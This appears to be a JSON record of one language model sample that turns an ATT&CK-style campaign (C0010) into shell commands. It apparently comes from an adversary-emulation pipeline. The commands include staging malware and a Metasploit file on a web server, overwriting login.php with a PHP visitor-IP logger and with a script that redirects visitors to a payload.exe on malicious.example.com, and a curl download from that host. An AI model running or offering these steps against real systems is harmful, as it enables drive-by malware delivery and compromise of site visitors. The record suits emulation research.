@@ -1,0 +1,102 @@
+{
+  "campaign_id": "C0010",
+  "model": "gpt-oss:20b",
+  "sample": 2,
+  "temperature": 0.7,
+  "realizations": [
+    {
+      "technique_id": "T1583.001",
+      "mechanism": "dnsmasq-add-host",
+      "command": "sudo dnsmasq --add-host=linkedin-bot.example.com,10.0.1.5",
+      "target": "actor.primary",
+      "parameters": {
+        "domain": "linkedin-bot.example.com",
+        "ip": "10.0.1.5"
+      }
+    },
+    {
+      "technique_id": "T1584.001",
+      "mechanism": "host-malicious-webpage",
+      "command": "sudo cp /artifact/benign/shell_config.txt /var/www/html/login.php",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "source_path": "/artifact/benign/shell_config.txt",
+        "destination_path": "/var/www/html/login.php"
+      }
+    },
+    {
+      "technique_id": "T1587.001",
+      "mechanism": "stage-malware",
+      "command": "cp /artifact/malware/SUGARUSH.exe /tmp/staging/",
+      "target": "actor.primary",
+      "parameters": {
+        "source_path": "/artifact/malware/SUGARUSH.exe",
+        "destination_path": "/tmp/staging/"
+      }
+    },
+    {
+      "technique_id": "T1588.002",
+      "mechanism": "stage-tool",
+      "command": "cp /toolkit/metasploit.rb /tmp/tools/",
+      "target": "actor.primary",
+      "parameters": {
+        "source_path": "/toolkit/metasploit.rb",
+        "destination_path": "/tmp/tools/"
+      }
+    },
+    {
+      "technique_id": "T1608.001",
+      "mechanism": "upload-malware-web",
+      "command": "mv /tmp/staging/SUGARUSH.exe /web_asset/benign_landing/malware.bin",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "source_path": "/tmp/staging/SUGARUSH.exe",
+        "destination_path": "/web_asset/benign_landing/malware.bin"
+      }
+    },
+    {
+      "technique_id": "T1608.002",
+      "mechanism": "upload-tool-web",
+      "command": "mv /tmp/tools/metasploit.rb /web_asset/benign_landing/tool.rb",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "source_path": "/tmp/tools/metasploit.rb",
+        "destination_path": "/web_asset/benign_landing/tool.rb"
+      }
+    },
+    {
+      "technique_id": "T1608.004",
+      "mechanism": "create-watering-hole",
+      "command": "echo \"<?php file_put_contents('/var/log/waterhole.log', \\\"{$_SERVER['REMOTE_ADDR']}\\n\\\", FILE_APPEND); ?>\" > /var/www/html/login.php",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "path": "/var/www/html/login.php",
+        "content": "<?php file_put_contents('/var/log/waterhole.log', \"{$_SERVER['REMOTE_ADDR']}\\n\", FILE_APPEND); ?>"
+      }
+    },
+    {
+      "technique_id": "T1189",
+      "mechanism": "serve-malicious-redirect",
+      "command": "echo \"<script>window.location='http://malicious.example.com/payload.exe';</script>\" > /var/www/html/login.php",
+      "target": "endpoint.public_service",
+      "parameters": {
+        "path": "/var/www/html/login.php",
+        "script": "<script>window.location='http://malicious.example.com/payload.exe';</script>"
+      }
+    },
+    {
+      "technique_id": "T1105",
+      "mechanism": "download-via-curl",
+      "command": "curl -o /tmp/metasploit.rb http://malicious.example.com/tools/metasploit.rb",
+      "target": "target.primary",
+      "parameters": {
+        "url": "http://malicious.example.com/tools/metasploit.rb",
+        "output": "/tmp/metasploit.rb"
+      }
+    }
+  ],
+  "raw_proposal_keys": [
+    "realizations"
+  ],
+  "response_sha256": "46dbf2832fab6c6c3ec430e96e9cc84bcb4c70110e714dcacdcb1be9f2fa1aef"
+}
